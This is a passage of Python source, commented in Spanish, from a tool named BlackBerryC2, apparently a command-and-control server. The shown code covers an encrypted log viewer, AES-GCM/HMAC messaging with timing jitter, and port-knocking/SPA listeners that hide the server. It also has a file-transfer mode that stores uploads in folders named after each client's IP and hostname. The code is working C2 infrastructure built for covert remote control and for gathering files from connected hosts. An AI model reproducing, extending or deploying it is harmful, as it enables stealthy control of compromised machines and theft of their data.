            "label":     "Server log (texto plano)",
            "file":      "BlackBerryC2_Server.log",
            "salt":      None,
            "encrypted": False,
            "key":       None,
        },
        {
            "label":     "Proxy log",
            "file":      "BlackBerryC2_ProxyGUI.log",
            "salt":      None,
            "encrypted": False,
            "key":       None,
        },
        {
            "label":     "Last start config",
            "file":      "last_start.json",
            "salt":      None,
            "encrypted": False,
            "key":       None,
        },
    ]

    # Filtrar solo los que existen
    available = []
    for entry in KNOWN_LOGS:
        path = os.path.join(log_dir, entry["file"])
        if os.path.exists(path):
            entry["path"] = path
            entry["size"] = os.path.getsize(path)
            available.append(entry)

    # También añadir cualquier .log/.jsonl desconocido en el directorio
    if os.path.exists(log_dir):
        known_files = {e["file"] for e in KNOWN_LOGS}
        for fname in sorted(os.listdir(log_dir)):
            if fname not in known_files and (fname.endswith('.log') or
               fname.endswith('.jsonl') or fname.endswith('.json')):
                path = os.path.join(log_dir, fname)
                available.append({
                    "label":     fname,
                    "file":      fname,
                    "path":      path,
                    "salt":      None,
                    "encrypted": False,
                    "key":       None,
                    "size":      os.path.getsize(path),
                })

    if not available:
        print(f"{YELLOW}[!] No hay logs disponibles en {log_dir}{RESET}")
        return

    # ── Mostrar menú ──────────────────────────────────────────────────────────
    while True:
        print(f"\n{B_CYAN}{'═'*60}{RESET}")
        print(f"{BOLD}{B_CYAN}  VISOR DE LOGS — BlackBerry C2{RESET}")
        print(f"{B_CYAN}{'═'*60}{RESET}")
        for i, entry in enumerate(available, 1):
            size_str = f"{entry['size']:>8,} B"
            enc_tag  = f"{GREEN}[ENC]{RESET}" if entry['encrypted'] else f"{B_BLACK}[TXT]{RESET}"
            print(f"  {BOLD}{i}{RESET}. {enc_tag} {entry['label']:<40} {B_BLACK}{size_str}{RESET}")
        print(f"\n  {BOLD}0{RESET}. Volver / Salir")
        print(f"{B_CYAN}{'─'*60}{RESET}")

        try:
            choice = input(f"  Selecciona log [{BOLD}1-{len(available)}{RESET}]: ").strip()
        except (KeyboardInterrupt, EOFError):
            print()
            return

        if choice == '0' or choice == '':
            return

        try:
            idx = int(choice) - 1
            if not (0 <= idx < len(available)):
                raise ValueError
        except ValueError:
            print(f"{RED}[!] Opción inválida{RESET}")
            continue

        entry = available[idx]
        print()  # separar del prompt
        print(f"\n{CYAN}  Log: {entry['file']}  ({entry['size']:,} bytes){RESET}")

        # ── Opciones de visualización ─────────────────────────────────────────
        print(f"  {BOLD}a{RESET}. Ver todo")
        print(f"  {BOLD}n{RESET}. Ver últimas N líneas")
        print(f"  {BOLD}r{RESET}. Ver en raw (sin parsear)")
        print(f"  {BOLD}s{RESET}. Guardar descifrado a archivo")
        print(f"  {BOLD}v{RESET}. Volver al menú")

        try:
            opt = input("  Opción: ").strip().lower()
        except (KeyboardInterrupt, EOFError):
            print()
            continue

        if opt == 'v' or opt == '':
            continue

        # Pedir número de líneas si eligió 'n'
        tail = 0
        if opt == 'n':
            try:
                n_str = input("  ¿Cuántas líneas? [50]: ").strip()
                tail = int(n_str) if n_str.isdigit() and int(n_str) > 0 else 50
            except (KeyboardInterrupt, EOFError):
                tail = 50

        # Resolver clave si el log está cifrado
        key = entry.get("key")
        if entry["encrypted"] and key is None:
            # Usar la clave ya en memoria según el tipo de log
            if _SESSION_LOG_KEY is not None:
                key = _SESSION_LOG_KEY
            elif _SERVER_LOG_KEY is not None:
                key = _SERVER_LOG_KEY
            else:
                # Solo pedir si no hay ninguna clave en memoria (modo --logs sin servidor)
                salt_path = os.path.join(log_dir, entry["salt"]) if entry["salt"] else None
                if salt_path:
                    key = _load_log_key_interactive(salt_path)
                    if key is None:
                        print(f"{YELLOW}[!] Sin clave — mostrando raw{RESET}")
                        opt = 'r'

        raw = (opt == 'r')

        if opt == 's':
            out_name = entry['file'].replace('.log','').replace('.jsonl','') + '_plain.txt'
            out_path = os.path.join(log_dir, out_name)
            # Guardar a archivo
            lines_out = []
            with open(entry["path"], 'r', errors='replace') as f:
                for line in f:
                    line = line.rstrip()
                    if not line:
                        continue
                    try:
                        if entry["encrypted"] and key:
                            line = _decrypt_log_line(line, key)
                        lines_out.append(line)
                    except Exception:
                        lines_out.append(line)
            with open(out_path, 'w') as f:
                f.write('\n'.join(lines_out) + '\n')
            print(f"{GREEN}[+] Guardado en: {out_path}{RESET}")
        else:
            # ── Mostrar log con reintento de passphrase si falla ──────────────
            _cur_key = key
            for _attempt in range(4):  # hasta 3 reintentos tras el primer intento
                ok = _display_log(entry["path"], entry["encrypted"], _cur_key,
                                  tail=tail, raw=raw)
                if ok or raw or not entry["encrypted"]:
                    break   # éxito o no aplica cifrado

                # ── Descifrado falló: pedir passphrase nueva ──────────────────
                salt_path = os.path.join(log_dir, entry["salt"]) if entry.get("salt") else None
                if not salt_path or not os.path.exists(salt_path):
                    print(f"{YELLOW}  [!] Salt no disponible — imposible reintentar.{RESET}")
                    break
                if _attempt >= 3:
                    print(f"{RED}  [!] Demasiados intentos. Volviendo al menú.{RESET}")
                    break
                print(f"{YELLOW}  Intento {_attempt + 2}/4 — introduce la passphrase correcta:{RESET}")
                new_key = _load_log_key_interactive(salt_path)
                if new_key is None:
                    print(f"{YELLOW}  Cancelado.{RESET}")
                    break
                _cur_key = new_key


def BlackBerrybanner():
    try:
        import banners
        banners.main()
    except ImportError:
        print(f"{eje}{B_GREEN}{BOLD} BlackBerryC2 v2.0{RESET}")
    except Exception as e:
        logging.exception("Error mostrando banner: %s", e)

SERVER_PRIVATE_KEY = None
SERVER_PUBLIC_PEM = None

def recvall(sock, n, timeout=30, session=None):
    """Recibe exactamente n bytes del socket con timeout configurado."""
    data = b''
    end = time.time() + timeout
    try:
        while len(data) < n:
            remaining = end - time.time()
            if remaining <= 0:
                logging.debug("Timeout en recvall")
                return None
            
            try:
                sock.settimeout(min(0.5, remaining))
            except (OSError, ValueError) as e:
                logging.debug(f"Socket cerrado en recvall: {e}")
                return None
            
            try:
                packet = sock.recv(n - len(data))
                if packet == b'':
                    return b''
                data += packet
            except socket.timeout:
                if remaining <= 0:
                    return None
                continue
            except (ConnectionResetError, BrokenPipeError, OSError) as e:
                logging.debug(f"Conexión perdida en recvall: {e}")
                return None
                
    except Exception as e:
        logging.exception("Error en recvall: %s", e)
        return None
    return data

def send_encrypted_message(sock, plaintext, aes_key, timeout=30, session=None):
    """Envío con HMAC por paquete + anti-replay"""
    try:
        try:
            sock.getpeername()
        except (OSError, AttributeError):
            logging.debug("Socket cerrado")
            return False
        
        import random
        jitter_ms = random.uniform(RESPONSE_JITTER_MIN_MS, RESPONSE_JITTER_MAX_MS)
        time.sleep(jitter_ms / 1000.0)
        sock.settimeout(timeout)
        
        if isinstance(plaintext, str):
            plaintext_bytes = plaintext.encode('utf-8', errors='replace')
        else:
            plaintext_bytes = plaintext
        
        flag = 0
        if ENABLE_COMPRESSION and len(plaintext_bytes) > 100:
            try:
                compressed = zlib.compress(plaintext_bytes, level=COMPRESSION_LEVEL)
                if len(compressed) < len(plaintext_bytes):
                    payload_to_encrypt = compressed
                    flag = 1
                else:
                    payload_to_encrypt = plaintext_bytes
            except Exception as e:
                logging.debug(f"Error comprimiendo: {e}")
                payload_to_encrypt = plaintext_bytes
        else:
            payload_to_encrypt = plaintext_bytes
        
        aesgcm = AESGCM(aes_key)
        nonce = os.urandom(12)
        ciphertext = aesgcm.encrypt(nonce, payload_to_encrypt, None)
        
        # Adquirir send_lock: sequence + build + sendall deben ser atómicos
        # para evitar que dos hilos intercalen bytes en el socket
        send_lock = getattr(session, 'send_lock', None) if session else None
        with (send_lock if send_lock else _null_context()):
            # Sequence number
            if session and hasattr(session, 'send_sequence'):
                sequence_num = session.send_sequence
                session.send_sequence += 1
            else:
                sequence_num = 0
            sequence_bytes = struct.pack('!Q', sequence_num)
            
            # HMAC sobre: seq || nonce || ciphertext
            hmac_key = getattr(session, 'hmac_key', aes_key)
            hmac_data = sequence_bytes + nonce + ciphertext
            hmac_tag = hmac_module.new(hmac_key, hmac_data, hashlib.sha256).digest()
            
            # Construir: seq + flag + nonce + ciphertext + HMAC
            message = sequence_bytes + bytes([flag]) + nonce + ciphertext + hmac_tag
            full_packet = struct.pack('!I', len(message)) + message
            sock.sendall(full_packet)
        
        if session:
            session.add_bytes_sent(len(full_packet), compressed=(flag == 1))
        
        return True
    except socket.timeout:
        logging.warning(f"Timeout enviando después de {timeout}s")
        return False
    except Exception as e:
        logging.exception("Error enviando: %s", e)
        return False


def receive_encrypted_message(sock, aes_key, timeout=30, session=None):
    """Recepción con verificación HMAC + anti-replay"""
    try:
        raw_len = recvall(sock, 4, timeout, session=session)
        if raw_len is None:
            return None, 'timeout'
        if raw_len == b'':
            return None, 'closed'
        if len(raw_len) < 4:
            return None, 'incomplete'
        
        msg_len = struct.unpack('!I', raw_len)[0]
        
        if msg_len > MAX_MESSAGE_SIZE:
            logging.warning(f"Mensaje demasiado grande: {msg_len} bytes")
            return None, 'message_too_large'
        
        data = recvall(sock, msg_len, timeout, session=session)
        if data is None:
            return None, 'timeout'
        if data == b'':
            return None, 'closed'
        if len(data) < 53:  # 8+1+12+32 mínimo
            return None, 'incomplete'
        
        # Parsear: [8:seq][1:flag][12:nonce][ciphertext][32:HMAC]
        sequence_bytes = data[0:8]
        flag = data[8]
        nonce = data[9:21]
        hmac_tag = data[-32:]
        ciphertext = data[21:-32]
        
        sequence_num = struct.unpack('!Q', sequence_bytes)[0]
        
        if session:
            session.add_bytes_received(4 + msg_len, compressed=(flag == 1 or flag == 2))
        
        # VERIFICAR HMAC ANTES DE DESCIFRAR
        hmac_key = getattr(session, 'hmac_key', aes_key)
        hmac_data = sequence_bytes + nonce + ciphertext
        expected_hmac = hmac_module.new(hmac_key, hmac_data, hashlib.sha256).digest()
        
        if not hmac_module.compare_digest(hmac_tag, expected_hmac):
            logging.warning(f"⚠ HMAC INVÁLIDO (seq {sequence_num})")
            return None, 'hmac_verification_failed'
        
        # Anti-replay check
        if session and hasattr(session, 'anti_replay'):
            if not session.anti_replay.check_and_update(sequence_num):
                logging.warning(f"⚠ REPLAY (seq {sequence_num})")
                return None, 'replay_detected'
        
        # Descifrar
        aesgcm = AESGCM(aes_key)
        try:
            plaintext_bytes = aesgcm.decrypt(nonce, ciphertext, None)
        except Exception as e:
            logging.warning(f"Error descifrando: {e}")
            return None, 'decrypt_error'
        
        if flag == 1:
            try:
                plaintext_bytes = zlib.decompress(plaintext_bytes)
                if session:
                    session.supports_compression = True
            except Exception as e:
                logging.warning(f"Error descomprimiendo zlib: {e}")
                return None, 'decompress_error'
        elif flag == 2:
            if not ZSTD_AVAILABLE:
                logging.error("Recibido zstd pero no disponible")
                return None, 'decompress_error'
            try:
                dctx = zstd.ZstdDecompressor()
                plaintext_bytes = dctx.decompress(plaintext_bytes)
                if session:
                    session.supports_compression = True
            except Exception as e:
                logging.warning(f"Error descomprimiendo zstd: {e}")
                return None, 'decompress_error'
        
        try:
            return plaintext_bytes.decode('utf-8'), 'ok'
        except Exception as e:
            logging.debug(f"Error UTF-8: {e}")
            return plaintext_bytes.decode('utf-8', errors='replace'), 'ok'
    
    except Exception as e:
        logging.exception("Error recibiendo: %s", e)
        return None, 'error'


# ============================================================
#  SPA / PORT-KNOCKING  —  funciones internas
# ============================================================

def spa_is_authorized(ip: str) -> bool:
    """True si la IP completó SPA/knock y su TTL no ha expirado."""
    if not SPA_ENABLED:
        return True          # sin SPA, todo pasa
    with spa_authz_lock:
        exp = spa_authorized_ips.get(ip)
        if exp and time.time() < exp:
            return True
        if exp:
            del spa_authorized_ips[ip]   # limpiar expirado
        return False

def spa_authorize_ip(ip: str):
    """Marca una IP como autorizada durante SPA_AUTHZ_TTL segundos."""
    with spa_authz_lock:
        spa_authorized_ips[ip] = time.time() + SPA_AUTHZ_TTL
    logging.info(f"[SPA] IP autorizada: {ip}  (TTL {SPA_AUTHZ_TTL}s)")

def _spa_cleanup_loop():
    """Hilo de limpieza periódica de tokens usados y IPs expiradas."""
    while True:
        try:
            time.sleep(60)
            now = time.time()
            with spa_authz_lock:
                expired = [ip for ip, exp in spa_authorized_ips.items() if exp < now]
                for ip in expired:
                    del spa_authorized_ips[ip]
            with spa_tokens_lock:
                # FIX: limpiar solo tokens expirados (>90s), nunca borrar todo el cache
                _now_spa = time.time()
                _expired = [k for k, ts in spa_used_tokens.items() if _now_spa - ts > 90]
                for k in _expired:
                    del spa_used_tokens[k]
                if len(spa_used_tokens) > 10000:
                    logging.warning("[SPA] Cache muy grande tras limpieza — posible flood UDP")
            with knock_partial_lock:
                stale = [ip for ip, s in knock_partial.items()
                         if now - s['ts'] > KNOCK_TIMEOUT + 5]
                for ip in stale:
                    del knock_partial[ip]
        except Exception:
            pass

def _verify_spa_token(ip: str, raw_payload: bytes) -> bool:
    """
    Verifica un token SPA (modo 'spa').
    El cliente envía:  HMAC-SHA256(HMAC_SECRET, "{ip}:{ventana_30s}")  (32 bytes)
    Admitimos ventana actual y anterior (±30 s de drift).
    """
    try:
        if len(raw_payload) != 32:
            return False
        now = int(time.time())
        for window in [now // 30, (now // 30) - 1]:
            msg    = f"{ip}:{window}".encode()
            expected = hmac_module.new(HMAC_PRE_SHARED_SECRET, msg, hashlib.sha256).digest()
            if hmac_module.compare_digest(raw_payload, expected):
                token_key = f"{ip}:{window}"
                with spa_tokens_lock:
                    if token_key in spa_used_tokens:
                        logging.warning(f"[SPA] Token replay detectado de {ip}")
                        return False
                    spa_used_tokens[token_key] = time.time()  # FIX: TTL por entrada
                return True
        return False
    except Exception as e:
        logging.exception(f"[SPA] Error verificando token de {ip}: {e}")
        return False

def _handle_knock_packet(ip: str, dst_port: int):
    """
    Actualiza el progreso de port-knocking para una IP.
    Si completa la secuencia KNOCK_SEQUENCE en orden dentro de KNOCK_TIMEOUT,
    la IP queda autorizada.
    """
    try:
        with knock_partial_lock:
            now   = time.time()
            state = knock_partial.get(ip)

            if state and now - state['ts'] > KNOCK_TIMEOUT:
                # Secuencia caducada, reiniciar
                del knock_partial[ip]
                state = None

            expected_port = KNOCK_SEQUENCE[state['idx'] if state else 0]

            if dst_port != expected_port:
                # Puerto incorrecto → reiniciar si ya tenían progreso
                if state:
                    logging.debug(f"[KNOCK] {ip}: puerto incorrecto ({dst_port}), reiniciando")
                    del knock_partial[ip]
                return

            # Puerto correcto
            if not state:
                if len(KNOCK_SEQUENCE) == 1:
                    # Secuencia de un solo golpe
                    knock_partial.pop(ip, None)
                    spa_authorize_ip(ip)
                    return
                knock_partial[ip] = {'idx': 1, 'ts': now}
            else:
                next_idx = state['idx'] + 1
                if next_idx >= len(KNOCK_SEQUENCE):
                    # Secuencia completa
                    del knock_partial[ip]
                    spa_authorize_ip(ip)
                else:
                    knock_partial[ip] = {'idx': next_idx, 'ts': now}
    except Exception as e:
        logging.exception(f"[KNOCK] Error procesando knock de {ip}:{dst_port}: {e}")

def start_spa_listener():
    """
    Arranca el hilo UDP que escucha tokens SPA o golpes de puerto.
    En modo 'knock' escucha en todos los puertos de KNOCK_SEQUENCE.
    En modo 'spa'   escucha en SPA_UDP_PORT.
    """
    if not SPA_ENABLED:
        return

    # Hilo de limpieza
    threading.Thread(target=_spa_cleanup_loop, daemon=True).start()

    if SPA_MODE == "knock":
        # Un hilo por cada puerto de la secuencia
        for kport in set(KNOCK_SEQUENCE):
            t = threading.Thread(
                target=_knock_udp_listener,
                args=(kport,),
                daemon=True
            )
            t.start()
        ports_str = ', '.join(map(str, KNOCK_SEQUENCE))
        print(f"\033[92m[+] SPA/Knock UDP escuchando en puertos: {ports_str}\033[0m")
        print(f"\033[96m    Secuencia: {' → '.join(map(str, KNOCK_SEQUENCE))}\033[0m")
        print(f"\033[96m    Timeout:   {KNOCK_TIMEOUT}s   AuthzTTL: {SPA_AUTHZ_TTL}s\033[0m")
    else:
        # Modo SPA: un solo socket UDP
        t = threading.Thread(target=_spa_udp_listener, daemon=True)
        t.start()
        print(f"\033[92m[+] SPA UDP escuchando en puerto {SPA_UDP_PORT}\033[0m")
        print(f"\033[96m    Token = HMAC-SHA256(HMAC_SECRET, \"{{ip}}:{{ventana_30s}}\")\033[0m")
        print(f"\033[96m    AuthzTTL: {SPA_AUTHZ_TTL}s\033[0m")

def _spa_udp_listener():
    """Escucha en SPA_UDP_PORT paquetes de 32 bytes (token HMAC)."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind(("0.0.0.0", SPA_UDP_PORT))
        sock.settimeout(2.0)
        logging.info(f"[SPA] Listener UDP en puerto {SPA_UDP_PORT}")
        while True:
            try:
                data, addr = sock.recvfrom(256)
                ip = addr[0]
                if _verify_spa_token(ip, data):
                    spa_authorize_ip(ip)
                    logging.info(f"[SPA] Token válido de {ip} → autorizado {SPA_AUTHZ_TTL}s")
                else:
                    logging.warning(f"[SPA] Token inválido de {ip}")
            except socket.timeout:
                continue
            except Exception as e:
                logging.debug(f"[SPA] Error en recvfrom: {e}")
    except Exception as e:
        logging.error(f"[SPA] Error fatal en listener: {e}")

def _knock_udp_listener(port: int):
    """Escucha en un puerto UDP específico para port-knocking."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind(("0.0.0.0", port))
        sock.settimeout(2.0)
        logging.info(f"[KNOCK] Listener UDP en puerto {port}")
        while True:
            try:
                _, addr = sock.recvfrom(64)
                ip = addr[0]
                logging.debug(f"[KNOCK] Golpe UDP recibido de {ip} en puerto {port}")
                _handle_knock_packet(ip, port)
            except socket.timeout:
                continue
            except Exception as e:
                logging.debug(f"[KNOCK] Error en recvfrom (:{port}): {e}")
    except Exception as e:
        logging.error(f"[KNOCK] Error fatal en listener :{port}: {e}")

# ============================================================
#  FIN SPA / PORT-KNOCKING
# ============================================================


# ==================== BERRYTRANSFER SERVER ====================
# Funciones de transferencia exclusiva (modo --berrytransfer).
# El servidor solo acepta CMD BT:* — sin acceso shell, sin C2.
# ==============================================================

BT_SERVER_CHUNK_SIZE = 256 * 1024   # 256KB


def bt_server_recv_chunks(sock, aes_key, dest_path, file_size, session):
    """Recibe chunks con AES-GCM + HMAC-SHA256 y los escribe en dest_path.
    Formato esperado: [4:len][8:seq][1:flag][12:nonce][ciphertext][32:HMAC]
    """
    sha = hashlib.sha256()
    received = 0
    expected_seq = 0
    timeout = max(300, int(file_size / (100 * 1024)))
    try:
        os.makedirs(os.path.dirname(os.path.abspath(dest_path)), exist_ok=True)
        with open(dest_path, 'wb') as f:
            while received < file_size:
                raw_len = recvall(sock, 4, timeout=timeout, session=session)
                if not raw_len:
                    return None, received
                pkt_len = struct.unpack('!I', raw_len)[0]
                packet  = recvall(sock, pkt_len, timeout=timeout, session=session)
                # Mínimo: 8(seq)+1(flag)+12(nonce)+1(ct_min)+32(HMAC) = 54
                if not packet or len(packet) < 54:
                    return None, received

                seq_bytes = packet[0:8]
                flag      = packet[8]
                nonce     = packet[9:21]
                hmac_tag  = packet[-32:]
                ct        = packet[21:-32]

                # Verificar HMAC
                hmac_data     = seq_bytes + nonce + ct
                expected_hmac = hmac_module.new(aes_key, hmac_data, hashlib.sha256).digest()
                if not hmac_module.compare_digest(hmac_tag, expected_hmac):
                    logging.warning(f"[BerryTransfer] HMAC inválido en chunk seq={struct.unpack('!Q', seq_bytes)[0]}")
                    return None, received

                # Verificar secuencia (anti-replay)
                seq_num = struct.unpack('!Q', seq_bytes)[0]
                if seq_num != expected_seq:
                    logging.warning(f"[BerryTransfer] Secuencia incorrecta: esperado {expected_seq}, recibido {seq_num}")
                    return None, received
                expected_seq += 1

                aesgcm = AESGCM(aes_key)
                try:
                    chunk = aesgcm.decrypt(nonce, ct, None)
                except Exception as e:
                    logging.error(f"[BerryTransfer] Error descifrando chunk: {e}")
                    return None, received
                if flag == 1:
                    try:
                        chunk = zlib.decompress(chunk)
                    except Exception:
                        return None, received
                elif flag == 2:
                    if ZSTD_AVAILABLE:
                        try:
                            dctx = zstd.ZstdDecompressor()
                            chunk = dctx.decompress(chunk)
                        except Exception:
                            return None, received
                    else:
                        return None, received
                f.write(chunk)
                sha.update(chunk)
                received += len(chunk)
        return sha.hexdigest(), received
    except Exception as e:
        logging.exception(f"[BerryTransfer] bt_server_recv_chunks: {e}")
        return None, received


def bt_server_send_chunks(sock, aes_key, file_path, session):
    """Envía archivo en chunks con AES-GCM + HMAC-SHA256.
    Formato: [4:len][8:seq][1:flag][12:nonce][ciphertext][32:HMAC]
    HMAC cubre: seq || nonce || ciphertext
    """
    file_size = os.path.getsize(file_path)
    timeout = max(300, int(file_size / (100 * 1024)))
    seq = 0
    with open(file_path, 'rb') as f:
        while True:
            chunk = f.read(BT_SERVER_CHUNK_SIZE)
            if not chunk:
                break
            flag = 0
            payload = chunk
            if ENABLE_COMPRESSION and len(chunk) > 1024:
                try:
                    comp = zlib.compress(chunk, level=6)
                    if len(comp) < len(chunk):
                        payload = comp
                        flag = 1
                except Exception:
                    pass
            aesgcm = AESGCM(aes_key)
            nonce  = os.urandom(12)
            ct     = aesgcm.encrypt(nonce, payload, None)

            # HMAC sobre: seq || nonce || ciphertext
            seq_bytes = struct.pack('!Q', seq)
            hmac_data = seq_bytes + nonce + ct
            hmac_tag  = hmac_module.new(aes_key, hmac_data, hashlib.sha256).digest()

            # Paquete: [8:seq][1:flag][12:nonce][ct][32:HMAC]
            packet      = seq_bytes + bytes([flag]) + nonce + ct + hmac_tag
            full_packet = struct.pack('!I', len(packet)) + packet
            sock.settimeout(timeout)
            sock.sendall(full_packet)
            seq += 1


def bt_server_session(session):
    """
    Sesion exclusiva BerryTransfer.
    - PUT (upload): siempre permitido. Se guarda en <root>/<IP>_<hostname>/
    - GET (download): requiere confirmacion del operador (o --auto-confirm)
    - LIST: lista archivos disponibles para descarga en la raiz BT
    """
    sock    = session.socket
    aes_key = session.aes_key
    ip      = session.address[0]
    cid     = session.session_id

    root_real = os.path.realpath(BERRYTRANSFER_ROOT)
    os.makedirs(root_real, exist_ok=True)

    # Asegurar que logs/ existe para bt_transfer.jsonl
    os.makedirs(os.path.dirname(BT_LOG_PATH), exist_ok=True)

    # Resolver hostname del cliente (best-effort)
    try:
        hostname = session.hostname or socket.getfqdn(ip)
    except Exception:
        hostname = ip
    # Sanitizar para nombre de carpeta
    safe_host = re.sub(r'[^a-zA-Z0-9._-]', '_', hostname)[:40]
    safe_ip   = ip.replace('.', '_').replace(':', '_')
    upload_dir = os.path.join(root_real, f"{safe_ip}_{safe_host}")
    os.makedirs(upload_dir, exist_ok=True)

    print(f"\n{B_CYAN}[BerryTransfer] --- Sesion #{cid} | {ip} ({hostname}) ---{RESET}")
    print(f"{B_CYAN}                    Uploads  → {upload_dir}{RESET}")
    print(f"{B_CYAN}                    Auto-confirm: {'SI' if BT_AUTO_CONFIRM else 'NO'}{RESET}")
    logging.info(f"[BerryTransfer] Sesion #{cid} de {ip} ({hostname}) iniciada")

    def _safe_upload_dest(rel_name):
        """Resuelve destino dentro de upload_dir del cliente."""
        safe   = os.path.basename(rel_name.replace('\\', '/'))  # solo nombre de archivo
        candidate = os.path.realpath(os.path.join(upload_dir, safe))
        if not candidate.startswith(upload_dir + os.sep) and candidate != upload_dir:
            return None
        return candidate

    def _safe_upload_rel(rel_path):
        """Para uploads de directorio — resuelve dentro de upload_dir."""
        parts = [p for p in rel_path.replace('\\','/').split('/') if p and p != '..']
        candidate = os.path.realpath(os.path.join(upload_dir, *parts))
        if not candidate.startswith(upload_dir):
            return None
        return candidate

    def _safe_download_src(name):
        """
        Resuelve fuente para download dentro de root_real.
        Devuelve la ruta resuelta (archivo O directorio) o None si no se encuentra.

        Acepta:
          - nombre simple:      "IP"              → busca archivo o directorio recursivamente
          - ruta relativa:      "sub/archivo.bin" → resuelve dentro de root_real
          - ruta absoluta:      solo si está dentro de root_real

        Si hay múltiples coincidencias para el mismo nombre, usa el más reciente.
        """
        norm = name.replace('\\', '/')

        # 1. Intentar como ruta directa (relativa) dentro de root_real
        candidate = os.path.realpath(os.path.join(root_real, norm))
        if candidate.startswith(root_real + os.sep) or candidate == root_real:
            if os.path.isfile(candidate) or os.path.isdir(candidate):
                logging.info(f"[BerryTransfer] GET resolve direct: {candidate}")
                return candidate

        # 2. Búsqueda recursiva por nombre (archivo o directorio) — máx 4 niveles
        basename = os.path.basename(norm)
        if not basename:
            return None

        found_files = []
        found_dirs  = []

        for dirpath, dirnames, filenames in os.walk(root_real):
            depth = len(os.path.relpath(dirpath, root_real).split(os.sep))
            if depth > 4:
                dirnames.clear()
                continue
            # Buscar directorios con ese nombre
            for dn in dirnames:
                if dn == basename:
                    dp = os.path.realpath(os.path.join(dirpath, dn))
                    if dp.startswith(root_real):
                        found_dirs.append(dp)
            # Buscar archivos con ese nombre
            if basename in filenames:
                fp = os.path.realpath(os.path.join(dirpath, basename))
                if fp.startswith(root_real):
                    found_files.append(fp)

        # Preferir archivos sobre directorios (más específico)
        candidates = found_files if found_files else found_dirs

        if len(candidates) == 1:
            logging.info(f"[BerryTransfer] GET resolve search: {candidates[0]}")
            return candidates[0]
        elif len(candidates) > 1:
            candidates.sort(key=lambda p: os.path.getmtime(p), reverse=True)
            logging.warning(f"[BerryTransfer] GET '{basename}': {len(candidates)} coincidencias, "
                            f"usando la más reciente: {candidates[0]}")
            return candidates[0]

        logging.warning(f"[BerryTransfer] GET '{name}': no encontrado en {root_real}")
        return None

    try:
        while True:
            msg, reason = receive_encrypted_message(sock, aes_key, timeout=300, session=session)

            if reason in ('closed', 'error'):
                logging.info(f"[BerryTransfer] #{cid}: conexion cerrada ({reason})")
                break
            if reason == 'timeout':
                logging.debug(f"[BerryTransfer] #{cid}: timeout esperando comando")
                break
            if msg is None:
                continue

            # ── BYE ───────────────────────────────────────────────────────────
            if msg == "BT:BYE":
                print(f"{B_CYAN}[BerryTransfer] #{cid} ({ip}) → BYE{RESET}")
                break

            # ── PUT (upload archivo) ──────────────────────────────────────────
            elif msg.startswith("BT:UPLOAD:"):
                try:
                    meta      = json.loads(msg[len("BT:UPLOAD:"):])
                    raw_name  = meta.get("name", "upload")
                    file_size = int(meta["size"])
                    file_hash = meta["sha256"]

                    dest_path = _safe_upload_dest(raw_name)
                    if dest_path is None:
                        send_encrypted_message(sock, "BT:ERR:path_traversal", aes_key, session=session)
                        bt_log_transfer("upload", ip, hostname, raw_name, file_size, False, "path_traversal")
                        continue

                    file_name = os.path.basename(dest_path)
                    print(f"{B_CYAN}[BerryTransfer] #{cid} <- PUT {file_name}"
                          f" ({format_bytes(file_size)})  →  {dest_path}{RESET}")
                    send_encrypted_message(sock, "BT:READY", aes_key, session=session)

                    t0 = time.time()
                    sha_actual, rcvd = bt_server_recv_chunks(sock, aes_key, dest_path, file_size, session)
                    elapsed_put = time.time() - t0

                    if sha_actual == file_hash and rcvd == file_size:
                        print(f"{B_GREEN}[BerryTransfer] OK PUT {file_name} ({format_bytes(file_size)}) "
                              f"en {elapsed_put:.1f}s → {upload_dir}{RESET}")
                        logging.info(f"[BerryTransfer] #{cid} PUT OK: {file_name} sha256={file_hash}")
                        bt_log_transfer("upload", ip, hostname, file_name, file_size, True, elapsed=elapsed_put)
                        send_encrypted_message(sock, f"BT:DONE:{file_name}", aes_key, session=session)
                    else:
                        try: os.remove(dest_path)
                        except Exception: pass
                        err = ("hash_mismatch" if sha_actual != file_hash
                               else f"size_mismatch:{rcvd}vs{file_size}")
                        print(f"{ALERT} {RED}[BerryTransfer] FAIL PUT {file_name}: {err}{RESET}")
                        logging.error(f"[BerryTransfer] #{cid} PUT FAIL: {file_name} {err}")
                        bt_log_transfer("upload", ip, hostname, file_name, file_size, False, err)
                        send_encrypted_message(sock, f"BT:ERR:{err}", aes_key, session=session)

                except Exception as e:
                    logging.exception(f"[BerryTransfer] Error BT:UPLOAD #{cid}: {e}")
                    try: send_encrypted_message(sock, f"BT:ERR:{e}", aes_key, session=session)
                    except Exception: pass

            # ── PUT directorio (upload_dir) ───────────────────────────────────
            elif msg.startswith("BT:UPLOAD_DIR:"):
                try:
                    meta      = json.loads(msg[len("BT:UPLOAD_DIR:"):])
                    base_raw  = meta.get("base", "upload_dir")
                    total_exp = int(meta.get("count", 0))
                    # La carpeta del directorio va dentro de upload_dir del cliente
                    base_name = os.path.basename(base_raw.replace('\\','/'))
                    dir_dest  = os.path.realpath(os.path.join(upload_dir, base_name))
                    if not dir_dest.startswith(upload_dir):
                        send_encrypted_message(sock, "BT:ERR:path_traversal", aes_key, session=session)
                        continue
                    os.makedirs(dir_dest, exist_ok=True)
                    print(f"{B_CYAN}[BerryTransfer] #{cid} <- PUT DIR {base_name} "
                          f"({total_exp} archivos)  →  {dir_dest}{RESET}")
                    send_encrypted_message(sock, "BT:READY", aes_key, session=session)

                    files_ok   = 0
                    total_size = 0

                    while True:
                        fmsg, freason = receive_encrypted_message(sock, aes_key, timeout=300, session=session)

                        if fmsg == "BT:DIR_DONE":
                            send_encrypted_message(sock, f"BT:ALL_DONE:{files_ok}", aes_key, session=session)
                            print(f"{B_GREEN}[BerryTransfer] OK DIR {base_name} "
                                  f"{files_ok}/{total_exp} archivos{RESET}")
                            logging.info(f"[BerryTransfer] #{cid} PUT DIR OK: {base_name} "
                                         f"{files_ok}/{total_exp}")
                            bt_log_transfer("upload", ip, hostname, base_name + "/",
                                            total_size, True,
                                            f"{files_ok}/{total_exp}_files")
                            break

                        elif fmsg and fmsg.startswith("BT:FILE:"):
                            try:
                                fmeta    = json.loads(fmsg[len("BT:FILE:"):])
                                rel_path = fmeta["path"]
                                f_size   = int(fmeta["size"])
                                f_hash   = fmeta["sha256"]

                                # Resolver dentro de upload_dir preservando sub-estructura
